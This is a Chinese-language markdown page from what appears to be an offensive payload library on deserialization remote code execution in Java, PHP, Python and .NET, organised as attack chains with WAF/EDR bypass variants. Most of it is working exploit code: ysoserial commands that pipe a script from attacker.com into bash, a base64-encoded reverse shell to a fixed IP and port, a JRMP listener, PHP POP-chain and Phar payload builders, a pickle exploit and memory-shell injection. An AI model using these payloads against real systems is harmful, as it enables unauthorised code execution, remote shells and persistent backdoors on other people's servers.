# RCE — 通用反序列化 payload 库

> 父文档:[00-index.md](00-index.md)
> 通用 PHP / Java 反序列化攻击链。框架相关反序列化(Fastjson / Shiro / WebLogic T3 / ViewState)见 [`10-framework.md`](10-framework.md)。

---

### 反序列化漏洞  `rce-deserialize`
利用反序列化漏洞实现RCE
子类：**反序列化** · tags: `rce` `deserialize` `java` `php`

**前置条件：** 存在反序列化点；存在可利用的Gadget链

**攻击链：**

**1. 1. Java反序列化**
_Java反序列化_
```
# 常见漏洞组件
Apache Commons Collections
Spring Framework
Fastjson
Jackson
WebLogic

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"
```

**2. 2. PHP反序列化**
_PHP反序列化_
```
<?php
class Exploit {
    public $cmd = "system('whoami');";
    function __destruct() {
        eval($this->cmd);
    }
}
echo serialize(new Exploit());
?>
生成: O:6:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
```

**3. 3. Python反序列化**
_Python pickle反序列化_
```
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
# 发送payload触发反序列化
```

**4. 4. .NET反序列化**  _[windows]_
_.NET反序列化_
```
# 使用ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"

# 常见格式
BinaryFormatter
Json.NET
XMLSerializer
```

**WAF/EDR 绕过变体：**

**1. 签名绕过**
_绕过签名验证_
```
如果存在签名验证
需要获取密钥重新签名
```

---

### PHP反序列化  `rce-deserialize-php`
PHP反序列化漏洞利用技术
子类：**PHP反序列化** · tags: `rce` `php` `deserialize` `unserialize`

**前置条件：** 存在unserialize调用；存在可利用的类

**攻击链：**

**1. 1. 魔术方法**
_PHP魔术方法_
```
__construct() - 对象创建时调用
__destruct() - 对象销毁时调用
__wakeup() - 反序列化时调用
__toString() - 对象转字符串时调用
__call() - 调用不存在方法时触发
```

**2. 2. 构造POP链**
_构造POP链_
```
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>
```

**3. 3. Phar反序列化**
_Phar反序列化_
```
# 生成Phar文件
<?php
class Exploit {}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>

# 触发反序列化
phar://exploit.phar/test.txt
```

**4. 4. Session反序列化**
_Session反序列化_
```
# 利用Session处理器差异
# php_serialize vs php_binary
构造恶意Session数据触发反序列化
```

**WAF/EDR 绕过变体：**

**1. 属性修饰符绕过**
_属性修饰符处理_
```
使用public/private/protected属性
注意序列化格式差异:
public: s:3:"cmd"
private: s:8:"\0Class\0cmd"
protected: s:7:"\0*\0cmd"
```

---

### Java反序列化  `rce-deserialize-java`
Java反序列化漏洞利用技术
子类：**Java反序列化** · tags: `rce` `java` `deserialize` `ysoserial`

**前置条件：** 存在Java反序列化点；存在Gadget链

**攻击链：**

**1. 1. 常见Gadget链**
_常见Gadget链_
```
CommonsCollections - Apache Commons Collections
CommonsBeanutils - Apache Commons BeanUtils
Spring - Spring Framework
Jdk7u21 - JDK原生Gadget
Groovy - Apache Groovy
Hibernate - Hibernate ORM
```

**2. 2. 使用ysoserial**
_使用ysoserial生成payload_
```
# 列出所有Gadget
java -jar ysoserial.jar

# 生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" > payload.ser
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

**3. 3. JRMP攻击**
_JRMP攻击_
```
# 启动JRMP服务
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"

# 发送JRMP客户端payload
java -jar ysoserial.jar JRMPClient attacker:4444
```

**4. 4. 内存马注入**
_内存马注入_
```
# 使用ysoserial注入内存马
java -jar ysoserial.jar CommonsCollections1 "生成内存马字节码"

# 或使用工具
java -jar ysuserial.jar CommonsCollections1 "内存马命令"
```

**WAF/EDR 绕过变体：**

**1. 二次反序列化**
_二次反序列化绕过_
```
使用SignedObject或RMI绕过黑名单
```

**2. 反射绕过**
_反射绕过_
```
使用反射设置属性绕过限制
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`10-framework.md`](10-framework.md)(框架反序列化)
